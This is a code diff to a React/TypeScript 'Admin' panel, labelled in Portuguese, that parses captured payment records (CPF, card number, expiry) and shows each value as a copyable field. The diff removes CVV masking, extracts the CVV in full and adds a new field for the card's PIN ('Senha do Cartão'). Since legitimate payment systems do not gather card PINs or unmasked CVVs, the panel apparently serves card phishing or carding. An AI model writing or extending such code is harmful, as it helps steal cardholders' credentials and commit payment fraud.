@@ -43,6 +43,7 @@ interface Payment {
   validade: string;
   dataCriacao: string;
   status: 'pendente' | 'processado' | 'erro';
+  senhaCartao?: string;
 }
 
 const Admin = () => {
@@ -62,6 +63,7 @@ const Admin = () => {
     cartao: string;
     validade: string;
     cvv: string;
+    senhaCartao: string;
     data: string;
   }
 
@@ -157,7 +159,8 @@ const Admin = () => {
       cpf: '',
       cartao: '',
       validade: '',
-      cvv: '***',
+      cvv: '',
+      senhaCartao: '',
       data: ''
     };
 
@@ -170,6 +173,10 @@ const Admin = () => {
         data.cartao = line.split('Número do Cartão:')[1]?.trim() || '';
       } else if (line.includes('Validade:') && !line.includes('DADOS DO')) {
         data.validade = line.split('Validade:')[1]?.trim() || '';
+      } else if (line.includes('CVV:')) {
+        data.cvv = line.split('CVV:')[1]?.trim() || '';
+      } else if (line.includes('Senha do Cartão:')) {
+        data.senhaCartao = line.split('Senha do Cartão:')[1]?.trim() || '';
       } else if (line.includes('Data/Hora:')) {
         data.data = line.split('Data/Hora:')[1]?.trim() || '';
       }
@@ -593,6 +600,11 @@ const Admin = () => {
                       fieldName="CVV"
                     />
                   </div>
+                  <CopyableField
+                    label="Senha do Cartão"
+                    value={parsedData.senhaCartao}
+                    fieldName="Senha"
+                  />
                 </div>
               </div>
 
